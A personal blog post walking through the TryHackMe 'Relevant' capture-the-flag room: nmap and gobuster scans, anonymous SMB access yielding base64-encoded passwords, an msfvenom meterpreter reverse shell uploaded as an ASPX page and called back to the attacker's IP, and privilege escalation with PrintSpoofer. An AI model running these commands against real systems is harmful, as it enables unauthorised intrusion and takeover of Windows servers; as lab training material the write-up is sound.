---
title: TryHackMe - Relevant
layout: post
categories:
- TryHackMe
tag:
- pentest,
- security,
- accessible
image: "/assets/img/relevant.jpeg"
image_alt: relevant
---

Relevant is a medium challenge from TryHackMe. There are some ways to complete this machine. I'll solve it one way. Let's start.

<br>

## 1. Pre-Engagement Briefing 

You have been assigned to a client that wants a penetration test conducted on an environment due to be released to production in seven days. 

Scope of Work

The client requests that an engineer conducts an assessment of the provided virtual environment. The client has asked that minimal information be provided about the assessment, wanting the engagement conducted from the eyes of a malicious actor (black box penetration test).  The client has asked that you secure two flags (no location provided) as proof of exploitation:

   - User.txt
   - Root.txt

Additionally, the client has provided the following scope allowances:

   - Any tools or techniques are permitted in this engagement, however we ask that you attempt manual exploitation first
   - Locate and note all vulnerabilities found
   - Submit the flags discovered to the dashboard
   - Only the IP address assigned to your machine is in scope
   - Find and report ALL vulnerabilities (yes, there is more than one path to root)

(Roleplay off)
I encourage you to approach this challenge as an actual penetration test. Consider writing a report, to include an executive summary, vulnerability and exploitation assessment, and remediation suggestions, as this will benefit you in preparation for the eLearnSecurity Certified Professional Penetration Tester or career as a penetration tester in the field.

Note - Nothing in this room requires Metasploit

Machine may take up to 5 minutes for all services to start.

**Writeups will not be accepted for this room.**

<br>

### 1.1 User Flag?

Let's do a nmap scan first.

```
$ nmap -sSV -P- 10.10.7.6
```

![nmap](/assets/img/tryhackme/relevant/nmap.png)

And we found a few ports that will work for us. These are 80/tcp HTTP, 49663/tcp HTTP, and 445/tcp

I did a gobuster scan, and the connection to both HTTP ports, probably due to my VPN, was very slow, I couldn't wait, so I couldn't get any results from the gobuster scan.

```
$ gobuster dir -u http://10.10.7.6:49663/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
```

![gobuster](/assets/img/tryhackme/relevant/gobuster.png)

So I decided to try SMB login.

```
$ smbclient -L //10.10.7.6
```

![smb](/assets/img/tryhackme/relevant/smb.png)

There is no password.

We found this `nt4wrksv`. Now, let's try to get in here.

```
$ smbclient //10.10.7.6/nt4wrksv
```

![password](/assets/img/tryhackme/relevant/password.png)

We found the passwords.txt file. Let's see what's in it.

```
> get passwords.txt
> exit
$ cat passwords.txt
```

![smbin](/assets/img/tryhackme/relevant/smbin.png)

This file contains base64 encoded credentials:

```
$ echo "Qm9iIVBAJCRXMHJEITRyMw==" | base64 -d
$ echo "QmlsbCAtIEp1dzRubmFNNG40MjA20TY5NjkhJCQK" | base4 -d
```

![base64](/assets/img/tryhackme/relevant/base64.png)

**`Bob : !P@$$W0rD!123`**

**`Bill: Juw4nnaM4n420696969!$$$`**

You have access to SMB, so let's check if we can install and run the reverse shell.

First, let's create a reverse shell. Then let's put it in SMB.

```
$ msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=10.8.168.86 lport=4444 -f aspx -o shell.aspx
$ smbclient //10.10.7.6/nt4wrksv
$ put shell.aspx 
```

![payload](/assets/img/tryhackme/relevant/payload.png)

Now let's create a listener using metasploit.

```
$ msfconsole
> use exploit/multi/handler
> set payload windows/x64/meterpreter_reverse_tcp
> set LHOST 10.8.168.86
> set LPORT 4444
> run
```
And call the reverse shell in the browser **`http://10.10.7.6:49663/nt4wrksv/shell.aspx`**

And we are inside.

![info](/assets/img/tryhackme/relevant/info.png)

Now we can get the user flag.

```
> cd c:/Users/Bob/Desktop
> cat user.txt
```

![user-flag](/assets/img/tryhackme/relevant/user-flag.png)

<br>

### 1.2 Root Flag?

We need to do an authorization elevation for the root flag. 
Running the “whoami /priv” command to check the current user’s privileges in the system:

```
> shell
> whoami /priv
```

![priv](/assets/img/tryhackme/relevant/priv.png)

It appears the current user has the SeImpersonatePrivilege token enabled, which means token impersonation could be used to escalate privileges.

Although Juicy Potato is normally used to exploit token impersonation, this only works if DCOM is enabled on the server. A great alternative is the PrintSpoofer exploit. Downloading the exploit from the Git repository and placing it on the nt4wrksv SMB share so it can be easily transferred to the target machine: [PrintSpoofer](https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0)

First, let's download the file and put it in SMB, then run it.

```
$ wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
$ smbclient //10.10.7.6/nt4wrksv
$ put PrintSpoofer64.exe
```

Let's go back to shell and follow.

```
> cd \inetpub\wwwroot\nt4wrksv
> dir
> PrintSpoofer64.exe -i -c powershell.exe
```

![privesc](/assets/img/tryhackme/relevant/privesc.png)

And now we have root privileges. Now we can reach the root flag. 

```
$ cd c:/Users/Administrator/Desktop
$ cat root.txt
```
<br>

---

<br>

It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.

<br>
